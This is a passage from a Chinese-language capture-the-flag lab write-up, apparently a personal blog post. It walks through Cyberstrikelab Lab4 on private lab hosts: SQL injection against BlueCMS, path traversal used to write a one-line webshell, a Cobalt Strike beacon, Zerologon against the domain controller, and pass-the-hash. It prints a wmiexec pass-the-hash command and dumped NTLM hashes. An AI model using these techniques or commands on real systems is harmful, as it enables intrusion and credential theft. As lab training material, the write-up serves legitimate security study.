+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">proxychains4 -q python3 wmiexec.py Administrator@192.168.20.30 -hashes aad3b435b51404eeaad3b435b51404ee:f349636281150c001081894de72b4e2b -codec gbk</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p><figure>
+  <img src="image-20250309165211809.png" alt="image-20250309165211809" loading="lazy"></figure>
+</p>
+<h1 class="heading-element" id="lab4"><span>Lab4</span>
+  <a href="#lab4" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h1><p><strong>难度：简单</strong></p>
+<p>目标：今天的你是一位白帽工程师，你发现某公司暴露在公网的cms有极其罕见的漏洞，于是你决定帮忙进行测试。</p>
+<p><strong>信息收集</strong></p>
+<p><figure>
+  <img src="image-20250310130702131.png" alt="image-20250310130702131" loading="lazy"></figure>
+</p>
+<p><figure>
+  <img src="image-20250310130240754.png" alt="image-20250310130240754" loading="lazy"></figure>
+</p>
+<h2 class="heading-element" id="边界突破---1921681010-1"><span>边界突破 - 192.168.10.10</span>
+  <a href="#%e8%be%b9%e7%95%8c%e7%aa%81%e7%a0%b4---1921681010-1" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>5820 搭建了一个 Bluecms，这个 cms 有一堆历史漏洞</p>
+<p><figure>
+  <img src="image-20250310130629347.png" alt="image-20250310130629347" loading="lazy"></figure>
+</p>
+<h3 class="heading-element" id="sql-注入"><span>SQL 注入</span>
+  <a href="#sql-%e6%b3%a8%e5%85%a5" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>通过SQL注入拿到账户密码，密码是个弱口令，直接弱口令尝试都能进后台。</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">http://192.168.10.10:5820/ad_js.php?ad_id=1</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p><figure>
+  <img src="image-20250310130358277.png" alt="image-20250310130358277" loading="lazy"></figure>
+</p>
+<p>爆库</p>
+<p><figure>
+  <img src="image-20250310130336889.png" alt="image-20250310130336889" loading="lazy"></figure>
+</p>
+<p>爆表</p>
+<p><figure>
+  <img src="image-20250310131442899.png" alt="image-20250310131442899" loading="lazy"></figure>
+</p>
+<h3 class="heading-element" id="路径穿越--任意文件修改"><span>路径穿越 &amp;&amp; 任意文件修改</span>
+  <a href="#%e8%b7%af%e5%be%84%e7%a9%bf%e8%b6%8a--%e4%bb%bb%e6%84%8f%e6%96%87%e4%bb%b6%e4%bf%ae%e6%94%b9" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>进入后台后充值中心 -&gt; 金币充值 -&gt; 在线支付并抓包</p>
+<p><figure>
+  <img src="image-20250310135031711.png" alt="image-20250310135031711" loading="lazy"></figure>
+</p>
+<p>修改 tpl_name 至指定文件路径</p>
+<p><figure>
+  <img src="image-20250310143645110.png" alt="image-20250310143645110" loading="lazy"></figure>
+</p>
+<p>然后就能任意修改文件内容了，添加一句话木马并保存</p>
+<p><figure>
+  <img src="image-20250310143953609.png" alt="image-20250310143953609" loading="lazy"></figure>
+</p>
+<p>访问，执行命令成功</p>
+<p><figure>
+  <img src="image-20250310144056765.png" alt="image-20250310144056765" loading="lazy"></figure>
+</p>
+<p>上线 CS</p>
+<p><figure>
+  <img src="image-20250310144955327.png" alt="image-20250310144955327" loading="lazy"></figure>
+</p>
+<p>拿到第一个旗帜</p>
+<p><figure>
+  <img src="image-20250311201845507.png" alt="image-20250311201845507" loading="lazy"></figure>
+</p>
+<h2 class="heading-element" id="域渗透-3"><span>域渗透</span>
+  <a href="#%e5%9f%9f%e6%b8%97%e9%80%8f-3" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p><strong>内网信息收集</strong></p>
+<p>内网信息还是和之前一样，20.20 是域成员，20.30 是域控</p>
+<p>`<figure>
+  <img src="image-20250310150016424.png" alt="image-20250310150016424" loading="lazy"></figure>
+</p>
+<h3 class="heading-element" id="域控---1921682030-3"><span>域控 - 192.168.20.30</span>
+  <a href="#%e5%9f%9f%e6%8e%a7---1921682030-3" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>这台域控依然可以使用 Zerologon 漏洞，通过其重置域控 hash</p>
+<p><figure>
+  <img src="image-20250311195925021.png" alt="image-20250311195925021" loading="lazy"></figure>
+</p>
+<p>导出域内所有用户的凭证，拿下域控管理员 hash</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">aad3b435b51404eeaad3b435b51404ee:00f995cbe63fd30411f44d434b8dac98</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p><figure>
+  <img src="image-20250311203818240.png" alt="image-20250311203818240" loading="lazy"></figure>
+</p>
+<p>登录域控</p>
+<p><figure>
+  <img src="image-20250311201337377.png" alt="image-20250311201337377" loading="lazy"></figure>
+</p>
+<p>拿到第二个旗帜</p>
+<p><figure>
+  <img src="image-20250311201402550.png" alt="image-20250311201402550" loading="lazy"></figure>
+</p>
+<h3 class="heading-element" id="域成员---1921682020-2"><span>域成员 - 192.168.20.20</span>
+  <a href="#%e5%9f%9f%e6%88%90%e5%91%98---1921682020-2" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>PTH 攻击，拿到第三个旗帜，结束</p>
+<p><figure>
+  <img src="image-20250311201717571.png" alt="image-20250311201717571" loading="lazy"></figure>
+</p>
+<p>=================</p>
+<p>后面都是换皮靶场，不打了</p>
+</div><div id="comments"><div id="giscus" class="comment">
+          <script
+            src="https://giscus.app/client.js"
+            data-repo="L1nq0/L1nq0.github.io"
+            data-repo-id="R_kgDOSLdcIg"
+            data-category="Announcements"
+            data-category-id="DIC_kwDOSLdcIs4DA03P"
+            data-mapping="pathname"
+            data-strict="0"
+            
+            data-theme="preferred_color_scheme"
+            data-reactions-enabled="1"
+            data-emit-metadata="0"
+            data-input-position="bottom"
+            data-lang="zh-CN"
+            data-loading="lazy"
+            crossorigin="anonymous"
+            async
+            defer
+          ></script>
+        </div>
+        <noscript>
+          Please enable JavaScript to view the comments powered by <a href="https://giscus.app/" rel="external nofollow noopener noreferrer">giscus</a>.
+        </noscript></div><div class="post-footer" id="post-footer"><ul class="post-footer-tags"><li class="post-footer-tag-item">
+          <a href="/tags/cyberstrikelab/" class="post-footer-tag-link" title="Tags - Cyberstrikelab">
+            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="post-footer-tag-icon"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 9l14 0"/><path d="M5 15l14 0"/><path d="M11 4l-4 16"/><path d="M17 4l-4 16"/></svg>
+            <span>Cyberstrikelab</span>
+          </a>
+        </li></ul><div class="post-footer-share">
+    <span class="post-footer-share-label">Share this post on:</span>
+    <div class="post-footer-share-links"><a href="javascript:void(0);" title="Share on X" data-sharer="twitter" data-url="https://sw1mblu3.fun/posts/cslab-lab1-7/" data-title="Cyberstrikelab Lab1-7 Writeup" data-via="map[icon:map[angellist: bandcamp: behance: bilibili: bitbucket: bluesky: buymeacoffee: class:fa-brands fa-x-twitter codepen: credly: csdn: deviantart: devto: diaspora: discord: discordinvite: douban: douyin: dribbble: facebook: feishu: fivehundredpx: flickr: foursquare: freecodecamp: gitea: gitlab: goodreads: googlescholar: hackernews: hackthebox: instagram: jsfiddle: kaggle: keybase: kickstarter: ko-fi: lastfm: liberapay: lichess: linktree: mastodon: matrix: mediawiki: medium: mix: odnoklassniki: orcid: patreon: paypal: phone: pinterest: pleroma: plume: qq: qqgroup: quora: reddit: researchgate: rootme: skype: slidershare: snapchat: soundcloud: spotify: stackoverflow: steam: strava: telegram: thingiverse: tiktok: tryhackme: tumblr: twitch: vine: vk: weibo: whatsapp: wordpress: xing: xmpp: youtubechannel: youtubecustom: youtubelegacy: zhihu:] id:L1nq1_ prefix:https://x.com/ title:X weight:2]" data-hashtags="Cyberstrikelab"><i class="fa-brands fa-x-twitter" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://sw1mblu3.fun/posts/cslab-lab1-7/" data-hashtag="Cyberstrikelab"><i class="fa-brands fa-facebook-square" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://sw1mblu3.fun/posts/cslab-lab1-7/" data-title="Cyberstrikelab Lab1-7 Writeup"><i class="fa-brands fa-weibo" aria-hidden="true"></i></a>
+  </div>
+  </div><hr class="post-footer-divider">
+    <div class="post-footer-nav"><div></div><a href="/posts/hackthebox-editorial/" class="post-footer-nav-next" rel="next">
+          <div>
+            <span class="post-footer-nav-label">Next Post</span>
+            <div class="post-footer-nav-title">HackTheBox Editorial Writeup</div>
+          </div>
+          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="post-footer-nav-arrow"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 6l6 6l-6 6"/></svg>
+        </a></div></div>
+</article>
+
+  <aside class="toc" id="toc-auto" aria-label="Contents"><h2 class="toc-title">Contents&nbsp;<i class="toc-icon fa-solid fa-angle-down" aria-hidden="true"></i></h2>
+      <div class="toc-content" id="toc-content-auto"></div></aside><dialog id="toc-dialog" aria-labelledby="toc-dialog-title" role="dialog">
+      <div class="toc">
+        <h2 class="toc-title">Contents</h2>
+        <div class="toc-content" id="toc-content-drawer"><nav >
+  <ul>
+    <li><a href="#lab1">Lab1</a>
+      <ul>
+        <li><a href="#边界突破---1921681010">边界突破 - 192.168.10.10</a>
+          <ul>
+            <li><a href="#thinkphp-5023-rce">ThinkPHP 5.0.23 RCE</a></li>
+          </ul>
+        </li>
+        <li><a href="#域渗透">域渗透</a>
+          <ul>
+            <li><a href="#域控---1921682030">域控 - 192.168.20.30</a></li>
+            <li><a href="#域成员---1921682020">域成员 - 192.168.20.20</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#lab2">Lab2</a>
+      <ul>
+        <li><a href="#独立工作站---1921681010">独立工作站 - 192.168.10.10</a>
+          <ul>
+            <li><a href="#弱口令爆破">弱口令/爆破</a></li>
+          </ul>
+        </li>
+        <li><a href="#域边界突破---1921681020">域边界突破 - 192.168.10.20</a>
+          <ul>
+            <li><a href="#tomcat-任意文件写入">Tomcat 任意文件写入</a></li>
+          </ul>
+        </li>
+        <li><a href="#域渗透-1">域渗透</a>
+          <ul>
+            <li><a href="#域控---1921682030-1">域控 - 192.168.20.30</a></li>
+            <li><a href="#代理转发上线-cs">代理转发上线 CS</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#lab3">Lab3</a>
+      <ul>
+        <li><a href="#边界机---1921681010">边界机 - 192.168.10.10</a>
+          <ul>
+            <li><a href="#路径遍历--文件上传">路径遍历 &amp;&amp; 文件上传</a></li>
+          </ul>
+        </li>
+        <li><a href="#域渗透-2">域渗透</a>
+          <ul>
+            <li><a href="#域成员---1921682020-1">域成员 - 192.168.20.20</a></li>
+            <li><a href="#域控---1921682030-2">域控 - 192.168.20.30</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#lab4">Lab4</a>
+      <ul>
+        <li><a href="#边界突破---1921681010-1">边界突破 - 192.168.10.10</a>
+          <ul>
+            <li><a href="#sql-注入">SQL 注入</a></li>
+            <li><a href="#路径穿越--任意文件修改">路径穿越 &amp;&amp; 任意文件修改</a></li>
+          </ul>
+        </li>
+        <li><a href="#域渗透-3">域渗透</a>
+          <ul>
+            <li><a href="#域控---1921682030-3">域控 - 192.168.20.30</a></li>
+            <li><a href="#域成员---1921682020-2">域成员 - 192.168.20.20</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+      </div>
+    </dialog><script>
+  (function() {
+    var tocLinks = document.querySelectorAll('#TableOfContents a');
+    var headings = document.querySelectorAll('.heading-element');
+    if (!tocLinks.length || !headings.length) return;
+
+    var linkMap = {};
+    tocLinks.forEach(function(a) {
+      var href = a.getAttribute('href');
+      if (href) linkMap[href] = a;
+    });
+
+    var tocLis = document.querySelectorAll('#TableOfContents li');
+    var activeId = null;
+
+    function setActive(id) {
+      if (id === activeId) return;
+      activeId = id;
+
+      var link = linkMap[id];
+      if (!link) return;
+
+      tocLinks.forEach(function(a) { a.classList.remove('active'); });
+      tocLis.forEach(function(li) { li.classList.remove('has-active'); });
+
+      link.classList.add('active');
+      var li = link.closest('li');
+      while (li) {
+        li.classList.add('has-active');
+        var parentUl = li.parentElement;
+        if (!parentUl || parentUl.id === 'TableOfContents') break;
+        li = parentUl.closest('li');
+      }
+    }
+
+    var observer = new IntersectionObserver(function(entries) {
+      var topEntry = null;
+      entries.forEach(function(entry) {
+        if (entry.isIntersecting) {
+          if (!topEntry || entry.boundingClientRect.top < topEntry.boundingClientRect.top) {
+            topEntry = entry;
+          }
+        }
+      });
+      if (topEntry) {
+        setActive('#' + topEntry.target.id);
+      }
+    }, {
+      rootMargin: '-80px 0px -50% 0px',
+      threshold: 0
+    });
+
+    headings.forEach(function(h) { observer.observe(h); });
+  })();
+  </script></main><footer class="footer">
+  <div class="footer-container"><hr class="footer-divider">
+
+    <div class="footer-row"><div class="footer-social">
+        <a href="https://github.com/L1nq0" target="_blank" rel="noopener noreferrer" class="footer-icon" title="GitHub">
+          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+            <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5"/>
+          </svg>
+        </a>
+        <a href="mailto:cryp71csec@gmail.com" class="footer-icon" title="Email">
+          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+            <path d="M3 7a2 2 0 0 1 2 -2h14a2 2 0 0 1 2 2v10a2 2 0 0 1 -2 2h-14a2 2 0 0 1 -2 -2v-10z"/>
+            <path d="M3 7l9 6l9 -6"/>
+          </svg>
+        </a>
+      </div><div class="footer-line">
+        <span>Copyright &copy; 2026</span>
+        <span class="footer-sep">|</span>
+        <span>All rights reserved.</span>
+      </div>
+    </div>
+  </div>
+</footer>
+</div><div class="widgets"><div class="fixed-buttons"><div class="fixed-button back-to-top animate__faster d-none" role="button" aria-label="Back to Top"><i class="fa-solid fa-arrow-up" aria-hidden="true"></i></div><div id="toc-drawer-button" class="fixed-button toc-drawer-button d-none" role="button" aria-label="Contents"><i class="fa-solid fa-bars" aria-hidden="true"></i></div><div class="fixed-button view-comments d-none" role="button" aria-label="View Comments"><i class="fa-solid fa-comment" aria-hidden="true"></i></div></div><div id="mask"></div><div class="reading-progress-bar" style="left: 0;top: 0;"></div><noscript>
+    <div class="noscript-warning">This website works best with JavaScript enabled.</div>
+  </noscript>
+</div><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/fuse/fuse.min.js" defer></script><script src="/lib/sharer/sharer.min.js" async defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script src="/lib/cell-tooltip/cell-tooltip.umd.js" defer></script><script src="/js/config/82cdf17e9ffad7b83535f4f081d55d50.js" defer></script><script src="/js/theme.min.js" defer></script></body>
+</html>
